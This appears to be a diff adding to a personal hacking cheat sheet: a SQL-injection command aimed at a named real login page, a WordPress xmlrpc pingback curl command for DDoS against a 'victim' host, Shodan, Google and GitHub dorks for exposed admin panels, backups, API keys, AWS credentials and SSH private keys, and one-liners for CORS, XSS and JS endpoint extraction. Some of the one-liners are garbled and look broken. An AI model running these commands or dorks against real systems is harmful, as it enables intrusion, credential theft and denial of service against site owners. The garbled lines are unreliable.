@@ -829,9 +829,94 @@ crlfi -i /home/lipon/Hacking/recon/urls.txt -o crlf.txt
 ssti -l /home/lipon/Hacking/recon/urls.txt -o ssti.txt
 RedirectHunter -l /home/lipon/Hacking/recon/urls.txt -o redirect.txt
 
-
 ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
 ghauri -r req.txt --batch --flush-session --level 3
 
-
 pip3 install -r requirements.txt --break-system-packages
+
+
+https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
+$ curl -D -  "www.anywordpresssite.com/xmlrpc.php" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim.com</string></value></param><param><value><string>www.anywordpresssite.com/postchosen</string></value></param></params></methodCall>'
+
+Useful Shodan Dorks:
+
+1. ssl.cert.subject.CN:"*.target.com" http.title:"index of /"
+2. ssl.cert.subject.CN:"*.target.com" http.title:"gitlab"
+3. ssl.cert.subject.CN:"*.target.com"
+"230 login successful" port:21
+4. ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
+5. http.title:"Directory Listing" org:orgName
+
+Quick Oneliner to Check for CORS:
+cat origins.txt | xargs -P10 -I{} bash -c 'curl -s -I -H "Origin: {}" -H "Access-Control-Request-Method: GET" https://target.com | grep -q "Access-Control-Allow-Origin: {}" && echo "[+] Vulnerable: {}"'
+
+Leveraging Dalfox to Easily Identify Reflected XSS:
+subfinder -d example.com -all -silent | httpx -silent | katana -silent | Gxss -c
+100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
+
+GiHub Dorks for Finding API Keys, Tokens, Passwords and Sensitive Files:
+
+1. api_key
+2. "api keys"
+3. authorization_bearer:
+4. oauth
+5. auth
+6. authentication 
+7. client_ secret 
+8. api_token:
+9. "api token" 
+10. client_id
+11. password
+12. user_password
+13. user_pass
+14. passcode
+15. client_secret
+16. secret
+17. password hash
+18. filename:manifest.xml
+19. filename: database
+20. filename: secrets.yml
+21. filename: passwd path: etc
+22. filename: config. php dbpasswd
+23. filename:.bash_profile aws
+24. filename:wp-config. php
+25. extension:sql mysql dump 
+26. filename: credentials aws_access_key_id 
+27. filename: id_rsa or filename:id_dsa
+28. filename:.sh _history
+29. filename: dockercfg auth 
+30. filename:WebServers .xml
+
+Interesting Google Dorks:
+
+intitle: "index of" inurl:ftp intext:admin 
+intitle: "index of" "system/config" 
+intitle: "index of" "admin/config"
+"index of" "/config/sql" 
+intitle:"index of" "api/admin" 
+intitle: "index of" "tinyfilemanager.php" intitle:"index of" "test/storage/framework/sessions/"
+intitle:"index of" "symfony/config" 
+intitle: "index of" "graphql/subscription" intitle: "index of" "/admin/backup" intitle:"index of" "admin/json" 
+intitle: "index of" "/admin_backup" intitle:"index of" "git-jira-log"
+intitle:"index of" db.frm
+intitle:"index of" "/db_backups/" intitle:"index of" "common.crt" OR "ca.crt"
+intitle:"index of" "global.asa"
+intitle:"index of" "proxy.pac" OR "proxy.pac.bak" 
+intitle: "index of" "MySQL-Router" intitle:"index of" "owncloud/config/*"
+
+Oneliners I use frequently in my engagements to extract all endpoints from a JS file:
+
+Method 1:
+waybackurls HOSTS | tac | sed "s#\\\/#\/hashtag#g" | egrep -o "src['\"]?
+15*[=: 1\5*[ '\"]?[^'\"]+.js[^'|"> ]*" | awk -F '/'
+'{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh
+-c "curl -k -s \"%)" | sed \"s/[;}\)>]/\n/g\" | grep -Po \" (L'1|\"](https?: )?[/1{1,2}[^'||l"> 1{5,3)|(\.
+(get|post|ajax|load)\s*\(\5*['||\"](https?:)?[/1{1,2}[^'||\"> ]
+{5,})\"" | awk -F "['|"]" '{print $2}' sort -fu
+
+Method 2:
+cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt
+
+
+
+
